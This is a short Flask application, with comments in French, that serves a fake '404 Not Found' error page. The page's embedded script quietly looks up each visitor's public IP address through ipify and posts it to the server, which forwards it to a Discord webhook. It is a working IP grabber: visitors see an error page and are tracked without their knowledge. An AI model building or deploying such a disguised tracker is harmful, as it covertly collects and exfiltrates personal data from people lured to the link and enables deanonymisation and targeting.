from flask import Flask, request
import requests

app = Flask(__name__)

WEBHOOK_URL = "YOUR WEBHOOK URL"

@app.route('/')
def index():
    return '''
    <html>
        <head><title>404 Not Found</title></head>
        <body>
            <h1>Erreur 404 Not Found</h1>
            <script>
                fetch('https://api64.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        fetch('/send_ip', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({ ip: data.ip })
                        });
                    });
            </script>
        </body>
    </html>
    ''', 404

@app.route('/send_ip', methods=['POST'])
def send_ip():
    ip = request.json.get('ip')
    print(f"Nouvelle IP publique : {ip}")

    # Envoi au webhook Discord
    data = {
        "content": f"📡 Nouvelle connexion depuis l'adresse IP publique : `{ip}`"
    }
    requests.post(WEBHOOK_URL, json=data)

    return '', 204  # Pas de contenu à renvoyer

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
